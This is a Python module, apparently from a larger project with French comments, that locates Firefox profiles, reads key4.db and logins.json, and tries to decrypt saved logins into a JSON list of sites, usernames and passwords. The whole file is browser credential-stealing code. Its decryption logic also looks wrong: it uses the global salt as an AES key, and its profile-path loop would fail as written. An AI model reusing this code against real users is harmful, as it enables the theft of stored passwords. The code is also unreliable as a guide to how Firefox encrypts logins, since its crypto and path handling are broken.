import json
import sqlite3
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

from main import IS_WINDOWS, IS_LINUX, IS_MAC
from config import FIREFOX_PATH


# Fonction pour récupérer le profil Firefox principal
def retrieve_profiles():
    for paths in FIREFOX_PATH.items():
        if IS_WINDOWS:
            user_data_path = paths["windows"]
        elif IS_LINUX:
            user_data_path = paths["linux"]
        else:
            user_data_path = paths["mac"]
            
    # Surement possibilité d'avoir plusieurs profils sur Firefox        
    profiles = []
    profiles_ini = user_data_path / "profiles.ini"

    if not profiles_ini.exists():
        print("Aucun profil Firefox trouvé.")
        return []

    with open(profiles_ini, "r", encoding="utf-8") as f:
        for line in f.readlines():
            if line.startswith("Path="):
                profiles.append(user_data_path / line.strip().split("=")[1])

    return profiles


# Fonction pour récupérer la clé de chiffrement depuis key4.db
def get_decryption_key(profile_path):
    key_db = profile_path / "key4.db"
    if not key_db.exists():
        print("Fichier key4.db non trouvé.")
        return None

    conn = sqlite3.connect(str(key_db))
    cursor = conn.cursor()
    cursor.execute("SELECT item1, item2 FROM metaData WHERE id = 'password' ")
    key_data = cursor.fetchone()
    conn.close()

    if key_data:
        global_salt, encrypted_key = key_data
        return decrypt_nss_key(global_salt, encrypted_key)
    return None


# Fonction de déchiffrement avec AES-GCM
def decrypt_nss_key(global_salt, encrypted_key):
    try:
        cipher = Cipher(
            algorithms.AES(global_salt),
            modes.GCM(encrypted_key[:12]),
            backend=default_backend(),
        )
        decryptor = cipher.decryptor()
        return decryptor.update(encrypted_key[12:]) + decryptor.finalize()
    except Exception as e:
        print(f"Erreur de déchiffrement NSS: {e}")
        return None


# Extraction et déchiffrement des mots de passe
def extract_passwords():
    profiles = retrieve_profiles()
    results = {}

    for profile in profiles:
        logins_path = profile / "logins.json"
        if not logins_path.exists():
            continue

        key = get_decryption_key(profile)
        if key is None:
            continue

        with open(logins_path, "r", encoding="utf-8") as f:
            logins = json.load(f)

        decrypted_passwords = []
        for login in logins.get("logins", []):
            try:
                password = decrypt_nss_key(
                    key, base64.b64decode(login["encryptedPassword"])
                )
                if password:
                    decrypted_passwords.append(
                        {
                            "url": login["hostname"],
                            "username": login["username"],
                            "password": password.decode(),
                        }
                    )
            except Exception as e:
                print(f"Erreur de déchiffrement d'un mot de passe: {e}")

        if decrypted_passwords:
            results[profile.name] = decrypted_passwords

    return json.dumps(results, indent=4)
